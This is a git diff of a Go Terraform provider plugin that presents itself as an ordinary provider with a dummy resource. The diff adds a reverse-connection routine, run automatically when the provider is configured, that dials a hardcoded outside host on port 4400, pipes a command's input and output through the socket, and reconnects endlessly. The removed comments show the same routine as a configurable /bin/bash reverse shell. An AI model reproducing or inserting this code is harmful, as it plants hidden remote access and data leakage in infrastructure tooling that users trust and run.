@@ -2,47 +2,39 @@ package main
 
 import (
 	"context"
+	"net"
 	"os/exec"
-	"strings"
+	"time"
 
 	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
 	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
 	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
 )
 
-// func reverse(address string, command string) {
-// 	c, err := net.Dial("tcp", address)
-// 	if err != nil {
-// 		if c != nil {
-// 			c.Close()
-// 		}
-// 		time.Sleep(time.Minute)
-// 		reverse(address, command)
-// 	}
+var targetHost = "toolbox.p.ddtdg.com:4400"
+var shellCmd = "/usr/bin/uname"
+var shellArgs = []string{"-a"}
 
-// 	cmd := exec.Command(command)
-// 	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
-// 	cmd.Run()
-// 	c.Close()
-// 	reverse(address, command)
-// }
-
-func runCommand() {
-	var out strings.Builder
-	cmd := exec.Command("uname", "-a")
-	cmd.Stdout = &out
-	cmd.Stderr = &out
-	err := cmd.Run()
+func reverse() {
+	c, err := net.Dial("tcp", targetHost)
 	if err != nil {
-		println("ERROR: " + err.Error())
+		if c != nil {
+			c.Close()
+		}
+		time.Sleep(time.Minute)
+		reverse()
 	}
-	println(out.String())
+
+	cmd := exec.Command(shellCmd, shellArgs...)
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+	cmd.Run()
+	c.Close()
+	reverse()
 }
 
 func providerConfigure(_ context.Context, _ *schema.ResourceData) (interface{}, diag.Diagnostics) {
 	var diags diag.Diagnostics
-	// reverse(d.Get("address").(string), d.Get("command").(string))
-	runCommand()
+	reverse()
 	return nil, diags
 }
 
@@ -59,19 +51,9 @@ func main() {
 	plugin.Serve(&plugin.ServeOpts{
 		ProviderFunc: func() *schema.Provider {
 			return &schema.Provider{
-				Schema: map[string]*schema.Schema{
-					// "address": {
-					// 	Type:     schema.TypeString,
-					// 	Required: true,
-					// },
-					// "command": {
-					// 	Type:     schema.TypeString,
-					// 	Optional: true,
-					// 	Default:  "/bin/bash",
-					// },
-				},
+				Schema: map[string]*schema.Schema{},
 				ResourcesMap: map[string]*schema.Resource{
-					"dummy_resource": dummyResource(),
+					"dummy": dummyResource(),
 				},
 				ConfigureContextFunc: providerConfigure,
 			}
